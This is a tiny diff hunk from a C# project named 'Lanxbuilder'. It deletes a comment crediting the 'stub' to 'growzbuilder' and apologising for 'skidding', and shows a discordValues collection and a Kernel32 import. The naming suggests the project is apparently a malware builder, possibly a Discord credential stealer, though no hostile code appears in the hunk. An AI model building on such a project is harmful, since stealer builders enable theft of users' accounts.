@@ -63,7 +63,6 @@ namespace Lanxbuilder
 		private static NameValueCollection discordValues = new NameValueCollection();
 	}
 
-	//this stub is originally by growzbuilder im sorry for skidding XD 
 	internal class Program
 	{
 		[DllImport("Kernel32.dll")]
